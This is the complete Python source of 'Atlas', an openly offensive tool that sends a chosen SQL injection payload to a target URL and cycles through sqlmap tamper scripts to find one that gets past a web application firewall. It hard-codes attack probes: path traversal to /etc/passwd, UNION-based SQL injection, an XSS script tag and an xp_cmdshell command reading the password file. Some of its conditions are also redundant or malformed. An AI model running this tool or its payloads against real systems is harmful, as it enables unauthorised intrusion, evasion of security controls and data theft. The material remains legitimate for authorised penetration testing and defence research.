#!/usr/bin/env python
# -*- coding:utf-8 -*-
# -----------------------------------------
# Atlas - Quick SQLMap Tamper Suggester
# by M'hamed ("m4ll0k") Outaadi 
# -----------------------------------------

import re
import sys
import getopt
from lib.ragent import *
from lib.params import *
from lib.request import *
from lib.printer import *
from urllib.parse import urlsplit
from humanfriendly.tables import format_pretty_table as pretty

class Process(Request,Params):
	# -- processor
	def __init__(self,url:str,method:str,data:str,kwargs:dict)->None:
		self.url = url 
		self.data = data
		self.kwargs = kwargs
		self.headers = kwargs.get('headers')
		self.method = method.lower()
		self.verbose = kwargs['verbose']
		self.payload = kwargs['payload']
		# --
		Request.__init__(self,kwargs)
		Params.__init__(self,url,kwargs['payload'].replace(' ','%20'),data,kwargs['headers'])

	def run(self)->None:
		injected = self.inject()
		if injected.get('h_injected'):
			info2('header injection detected..')
		if self.method == 'get' and (injected.get('get') != [] or injected.get('get') == []) or self.method == 'get' and injected.get('h_injected'):
			if injected.get('get') != []:
				for url in injected.get('get'):
					if self.kwargs['verbose']:
						info2('URL: "%s"..'%(url))
					resp = self.send(url,self.method,self.data,injected.get('headers'))
					if self.kwargs['var'] == 0:
						if resp.code == 404:
							warn2('server return \033[1;31m\"404\"\033[0;33m status code, please check your path!',1)
						return resp.code 
					elif self.kwargs['var'] == 1:
						if resp.code in range(400,599):
							warn('return HTTP error code: \"%s\"'%resp.code)
						elif resp.code in range(200,299):
							plus('return HTTP code \"%s\", a potential tamper is found: "%s"'%(resp.code,self.kwargs['tamper']))
			if injected.get('h_injected'):
				if self.kwargs['verbose']:
					info2('URL: "%s"..'%(self.url))
				resp = self.send(self.url,self.method,self.data,injected.get('headers'))
				if self.kwargs['var'] == 0:
					# ??? issue here
					if resp.code == 404:
						warn2('server return \033[1;31m\"404\"\033[0;33m status code, please check your path!',1)
					return resp.code
				elif self.kwargs['var'] == 1:
					if resp.code in range(400,599):
						warn('return HTTP error code: "%s"'%resp.code)
					elif resp.code in range(200,299):
						plus('return HTTP code \"%s\", a potential tamper is found: "%s"'%(resp.code,self.kwargs['tamper']))
		elif self.method == 'post' and (injected.get('post') != [] or injected.get('post') == []) or self.method == 'post' and injected.get('h_injected'):
			if injected.get('post') != [] and not injected.get('h_injected'):
				for data in injected.get('post'):
					resp = self.send(self.url,self.method,data.encode('utf-8'),injected.get('headers'))
					if self.kwargs['var'] == 0:
						return resp.code 
					elif self.kwargs['var'] == 1:
						if resp.code in range(400,599):
							warn('return HTTP error code: "%s"'%resp.code)
						elif resp.code in range(200,299):
							plus('return HTTP code "%s", a potential tamper is found: "%s"'%(resp.code,self.kwargs['tamper']))
			if injected.get('h_injected'):
				if self.kwargs['verbose']:
					info2('URL: "%s"..'%(self.url))
				resp = self.send(self.url,self.method,self.data.encode('utf-8'),injected.get('headers'))
				if self.kwargs['var'] == 0:
					return resp.code 
				elif self.kwargs['var'] == 1:
					if resp.code in range(400,599):
						warn('return HTTP error code: "%s"'%resp.code)
					elif resp.code in resp.code in range(200,299):
						plus('return HTTP code "%s", a potential tamper is found: "%s"'%(resp.code,self.kwargs['tamper']))
	
	def waf_detector(self)->None:
		# -- 
		payload  = ['../etc/passwd']
		payload += ['" AND 1=2, OR 1=2']
		payload += ['<scrit>alert(1)</script>']
		payload += ['7116 AND 1=1 UNION ALL SELECT 1,NULL,']
		payload[3] += "<script>alert(\"XSS\")</script>,table_name"
		payload[3] += " FROM information_schema.tables WHERE 2>1--/**/;"
		payload[3] += "EXEC xp_cmdshell('cat ../../../etc/passwd')"
		# --
		for p in payload:
			p = p.replace(' ','%20')
			injected = Params(self.url,p,self.data,self.kwargs['headers']).inject()
			if self.method == 'get' and injected.get('get') != []:
				for url in injected.get('get'):
					resp = self.send(url,self.method,self.data.encode('utf-8'),injected.get('headers'))	
					what_waf = waf_identify(resp.headers,resp.content,resp.code)
					if what_waf:
						return
			elif self.method == 'post' and (injected.get('post') != []):
				for data in injected.get('post'):
					resp = self.send(self.url,self.method,self.data.encode('utf-8'),injected.get('headers'))
					what_waf = waf_identify(resp.headers,resp.content,resp.code)
					if what_waf:
						return 
		return

class Parse(object):
	def __init__(self,url:str)->None:
		if 'http' in url or 'https' in url:
			self.host = urlsplit(url).netloc
			self.path = urlsplit(url).path

class atlas(object):
	def usage(self,_=False)->None:
		def p_usage()->None:
			usage  = "Usage: {name} [OPTIONS]\n\n".format(name=sys.argv[0])
			usage += "\t-u --url\t\tTarget URL (e.g: http://test.com/index.php?id=1)\n"
			usage += "\t-p --payload\t\tSet Payload (SQLMap payload return 4xx-5xx code)\n"
			usage += "\t-d --dbms\t\tSet DBMS: mysql,mssql,..etc (more quick!)\n"
			usage += "\t-m --method\t\tSet method: POST or GET\n"
			usage += "\t-C --concat\t\tConcatenate different tampers (\"tamper1,tamper2,..\")\n"
			usage += "\t-g --get-tampers\tGet list of all tampers\n"
			usage += "\t-H --headers\t\tSet headers values (support curl method)\n"
			usage += "\t-D --data\t\tSet post data (e.g: --data=\"id=1..\")\n"
			usage += "\t-a --agent\t\tSet HTTP User agent (e.g: --agent=\"string..\")\n"
			usage += "\t-c --cookie\t\tSet HTTP Cookie (e.g: --cookie=\"string..\")\n"
			usage += "\t-r --random-agent\tSet a random HTTP User agent\n"
			usage += "\t-A --allow-redirect\tAllow target URL redirect\n"
			usage += "\t-t --timeout\t\tSet timeout (e.g: --timeout=\"5\")\n"
			usage += "\t-v --verbose\t\tShow more information\n"
			usage += "\t-h --help\t\tShow this help and exit\n"
			return usage
		self.banner()
		print(p_usage())
		if(_):sys.exit(0)
	
	def headers_c(self,headers:dict)->dict:
		if  ':' not in headers:
			warn2('malformed headers.. check your headers',1)
		h = headers.split(':')
		return {h[0]:h[1]}
		
	
	def banner(self,__=False,_=False)->None:
		print(r"       _   _                      ")
		print(r"      | | | |                     ") 
		print(r"  __ _| |_| | __ _ ___            ")
		print(r" / _` | __| |/ _` / __|           ")
		print(r"| (_| | |_| | (_| \__ \ v.1.0     ")
		print(r" \__,_|\__|_|\__,_|___/ by M4ll0k ")
		print(r"                                  ")
		print(r" Quick SQLMap Tamper Suggester    ")
		print(r"-----------------------------------")
		if(_):sys.exit(0)
		if(__):print('')
	
	def main(self)->None:
		kwargs = {
					'url'            : None, 
					'payload'        : None, 
					'dbms'           : 'general', 
					'method'         : 'GET', 
					'data'           : "",
					'concat'         : None,
					'headers'        : {},
					'agent'          : ragent(),
					'cookie'         : None, 
					'random-agent'   : False,
					'get-tampers'    : False,
					'allow-redirect' : False, 
					'timeout'        : None, 
					'verbose'        : False,
					'proxy'          : None,
					'var'            : 0,
					'tamper'         : None
				}
		# -- cmd args -- #
		s_cmd  = "u:p:d:m:D:a:C:c:t:H:Avrhg"
		l_cmd  = [
		          "url=","payload=","dbms=","headers=","method=","get-tampers","concat=","data=","agent=","cookie=",
		          "random-agent","allow-redirect","timeout=","verbose=","help="
		        ]
		try:
			opts,args = getopt.getopt(sys.argv[1:],s_cmd,l_cmd)
		except getopt.GetoptError as e:
			self.usage(True)
		for i in range(len(opts)):
			if(opts[i][0] in('-h','--help')):self.usage(1)
			if(opts[i][0] in('-u','--url')):kwargs['url']=opts[i][1]
			if(opts[i][0] in('-p','--payload')):kwargs['payload']=opts[i][1]
			if(opts[i][0] in('-d','--dbms')):kwargs['dbms']=opts[i][1]
			if(opts[i][0] in('-C','--concat')):kwargs['concat']=opts[i][1]
			if(opts[i][0] in('-g','--get-tampers')):kwargs['get-tampers'] = True
			if(opts[i][0] in('-m','--method')):kwargs['method'] = opts[i][1]
			if(opts[i][0] in('-D','--data')):kwargs['data']=opts[i][1]
			if(opts[i][0] in('-a','--agent')):kwargs['agent']=opts[i][1]
			if(opts[i][0] in('-H','--headers')):kwargs['headers'].update(self.headers_c(opts[i][1]))
			if(opts[i][0] in('-c','--cookie')):kwargs['cookie']=opts[i][1]
			if(opts[i][0] in('-t','--timeout')):kwargs['timeout']=opts[i][1]
			if(opts[i][0] in('-v','--verbose')):kwargs['verbose']=True
			if(opts[i][0] in('-r','--random-agent')):kwargs['agent']=ragent()
			if(opts[i][0] in('-A','--allow-redirect')):kwargs['allow-redirect']=True
		# -- * --
		if kwargs['get-tampers']:
			_p = []
			for tamper in tamper_importer('all'):
				_p.append(tamper.__name__.split('_'))
			print(pretty(_p,['dbms','tamper']))
			sys.exit(0)
		if(len(sys.argv)<2) or not kwargs['url']:
			self.usage(1)
		if(kwargs['payload'] is None):
			warn2('Please set payload with "-p|--payload" options',1)
		self.banner(__=1)
		print("[*] Starting at %s\n"%(strftime))
 		# -- vars -- #
		_dbms = kwargs['dbms']
		_payload = kwargs['payload']
		# -- init -- #
		plus2('testing connection to the target URL...')
		info2('checking if the payload is blocked by some kind of WAF/IDS/IPS..')
		kwargs['var'] = 0
		# -- run -- 
		get_code = Process(
			url = kwargs['url'],
			method = kwargs['method'],
			data = kwargs['data'],
			kwargs = kwargs
			)
		code = get_code.run() 
		# -- check
		if code in range(400,599):
			warn2('return HTTP error code \033[1;31m\"%s\"\033[0;33m, the target is protected by some kind of WAF/IDS/IPS..'%code)
			plus2('using WAF scripts to detect backend WAF/IPS/IDS protection')
			waf_ = Process(
				url = kwargs['url'],
				method = kwargs['method'],
				data = kwargs['data'],
				kwargs = kwargs
				).waf_detector()
		else:
			# print msg and exit
			plus('return HTTP code \"%s\", the payload not blocked by some kind of WAF/IDS/IPS..'%code,1)
		plus2('trying with sqlmap tampers...')
		kwargs['var'] = 1
		if _dbms:
			info2('loading \"%s\" tampers...'%_dbms)
			tampers = tamper_importer(_dbms)
			if not tampers:
				warn2('%s tampers not found for this dbms.. loading generic tampers..'%_dbms.upper())
				tampers = tamper_importer('general')
		if kwargs['concat'] != None:
			l_ = kwargs['concat'].split(',')
			kwargs['tamper'] = kwargs['concat']
			info2('tamper concatination.. %s'%",".join(l_))
			concat_ = []
			for tamper in tampers:
				tamper_ = tamper.__name__.split('_')[1]
				if tamper_ in l_:
					concat_.append(tamper)
			p = _payload
			# concatination..
			for i in concat_:
				p = str(i(p)).replace(r'\u',r'\\u')
			# --
			if p != _payload:
				kwargs['payload'] = p
				if kwargs['verbose']:
					payload(p)
				inject_payload = Process(
					kwargs.get('url'),
					kwargs.get('method'),
					kwargs.get('data'),
					kwargs
				);inject_payload.run()
		else:
			for tamper in tampers:
				kwargs['tamper'] = tamper.__name__.split('_')[1]
				info2("trying with \"%s\" tamper..."%tamper.__name__.split('_')[1])
				payload__ = str(tamper(_payload)).replace(r'\u',r'\\u')
				if payload__ != kwargs['payload']:
					kwargs['payload'] = payload__
					if kwargs['verbose']:
						payload(kwargs['payload'])
					inject_payload = Process(
						kwargs.get('url'),
						kwargs.get('method'),
						kwargs.get('data'),
						kwargs,
					);inject_payload.run()

def waf_identify(headers:dict,content:str,code:int)->bool:
	# -- waf 
	path = os.path.join(os.path.abspath('.'),'waf')
	for file in listdir(path):
		file = file.split('.py')[0]
		__import__("waf.%s"%file)
		waf = sys.modules['waf.%s'%file]
		waf = waf.__dict__[file]
		wf = waf(headers,str(content),code)
		if(wf):
			info2('WAF/IPS/IDS identified as: \033[1;38m%s\033[0m'%wf)
			return True

def listdir(path:str)->list:
	py_files = []
	for file in os.listdir(path):
		if file.endswith('.py')and not file == '__init__.py':
			py_files.append(file)
	return py_files

def tamper_importer(dbms:str)->list:
	# -- tampers
	tampers = []
	path = os.path.join(os.path.abspath('.'),'tamper')
	for file in listdir(path):
		file = file.split('.py')[0]
		__import__("tamper.%s"%file)
		tamper = sys.modules['tamper.%s'%file]
		tamper = tamper.__dict__[file]
		if tamper not in tampers:
			if dbms == 'all':
				tampers.append(tamper)
			elif dbms in tamper.__name__:
				tampers.append(tamper)
	return tampers

try:
	atlas().main()
except KeyboardInterrupt as e:
	warn('User quit!!',1)
